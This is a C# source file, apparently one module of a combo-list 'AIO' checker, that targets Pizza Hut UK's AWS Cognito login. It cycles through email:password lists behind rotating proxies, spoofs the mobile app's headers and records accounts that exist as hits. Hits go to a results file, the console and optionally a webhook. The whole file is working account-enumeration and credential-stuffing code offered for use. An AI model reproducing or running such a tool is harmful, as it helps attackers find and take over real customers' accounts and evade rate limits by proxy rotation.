using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Pizzahutmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("User-Agent",
                                "Mozilla/5.0 (Linux; Android 6.0.1; SM-J106H Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.105 Mobile Safari/537.36 hasFix PHAPP");
                            req.AddHeader("Host", "cognito-idp.eu-west-1.amazonaws.com");
                            req.AddHeader("X-Amz-Target", "AWSCognitoIdentityProviderService.InitiateAuth");
                            req.AddHeader("X-Environment-Flag", "production");
                            req.AddHeader("X-Amz-User-Agent", "aws-amplify/0.1.x js");
                            req.AddHeader("Content-Type", "application/x-amz-json-1.1");
                            req.AddHeader("Origin", "https://www.pizzahut.co.uk");
                            req.AddHeader("X-Requested-With", "com.pizzahutuk.orderingApp");
                            var str =
                                "{\"AuthFlow\":\"USER_SRP_AUTH\",\"ClientId\":\"39sg678apec8n28fj4ekuuc8fl\",\"AuthParameters\":{\"USERNAME\":\"" +
                                array[0] +
                                "\",\"SRP_A\":\"cf1f8246611b2d6c2f36b68a58ad8f1a10c57ba04965f6b3c24dfc1dbff6ae22b4f5e86ea790d66dde2befcd9d4d0e26e8d217c81cab0a456f2f26e5c9dd96d173bad0699ab48fc6297e524d093a2c16fe4fb30a958041b717120f68da42401f0733d3c19d3b7e127dc0cff9e1cb1b15adce363b696f45d2ce763a25783830a4ff45c71c817350779398b1783f36f0415912b2c284c161f4ed135ac3ad501b3b3557745c1a66c2af35034b9a34e02a012bd0642f0d90e162da9cd4cac6e5943b98c1bc47d1c9cd9fd0a1742b54c05fd79470ba755f49c64c6a67e37d5dc6a14f21c2ca6ada83e1bb0a412945e067607e487ce8964828535a58ddf9fe5ba6872ca8a578773872ccd6b648beb988e74fa955c8058989f1b3801f39adc81d87560614b609f5c5077b5a0fb643c751e57c5e93269ea3c92dcf64e00ddb37e6f56ee0978cd020d4b15477511913ee38f211bda96fe378f4fde118b3b3adb57c1e1c2a264fe102129eb1390c39f827f8c08df94f3a0d3219845110f8d9b8f47bd833f2\"},\"ClientMetadata\":{}}";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://cognito-idp.eu-west-1.amazonaws.com/", str,
                                "application/x-amz-json-1.1").ToString();
                            {
                                if (strResponse.Contains("User does not exist"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("ChallengeName\":\"PASSWORD_VERIFIER"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/PizzaUKvalidmail_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("PizzaUKvalidmail", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "PizzaUKvalidmail Hits");
                                }
                                else
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}